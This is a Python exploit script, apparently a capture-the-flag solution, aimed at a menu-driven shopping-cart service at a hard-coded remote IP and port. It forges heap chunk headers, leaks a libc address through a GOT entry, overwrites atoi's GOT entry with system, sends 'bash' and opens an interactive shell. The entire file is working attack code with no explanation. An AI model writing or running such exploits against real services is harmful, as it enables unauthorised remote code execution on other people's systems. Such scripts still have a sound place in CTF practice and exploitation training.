#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re


host = "180.76.178.48"
#host = "10.211.55.16"
port = 23333
#port = 8888

sock = make_conn(host,port)

atoi_got = 0x804b038

def create(sock,data,many):
    recvuntil(sock,":")
    sendline(sock,"1")
    recvuntil(sock,"5.Jianjiao")
    sendline(sock,data)
    recvuntil(sock,"?")
    sendline(sock,str(many))

def review(sock):
    recvuntil(sock,":")
    sendline(sock,"4")
    recvuntil(sock,"Cart:")
    data = recvuntil(sock,"Total")
    val = int(data.split("\n")[-2].split("*")[1].strip())
    if val < 0 :
        val += 0x100000000
    return val

def leak(addr):
    global sock
    payload = "b"*32 + pack32(addr)
    create(sock,payload,1)
    result = review(sock)
    return pack32(result)

addr = pack32(0) + pack32(0x31)
phone = "a"*0xf0 + pack32(0) + pack32(0x31)

recvuntil(sock,":")
sendline(sock,addr)
recvuntil(sock,":")
sendline(sock,phone)

payload = "b"*32 + pack32(0x804b034)
create(sock,payload,1)
startmain = review(sock)
libc = startmain -0x186c0

put_off = 0x62780
stratmain_off = 0x186c0
print "libc :",hex(libc)
system = libc + 0x3bf80
system -= 0x100000000

payload = "c"*32 + pack32(0x804b1b8)
create(sock,payload,1)

recvuntil(sock,":")
sendline(sock,"2")

payload = "a"*4
payload += pack32(atoi_got)


create(sock,payload,system)
recvuntil(sock,":")
sendline(sock,"bash")
inter(sock)
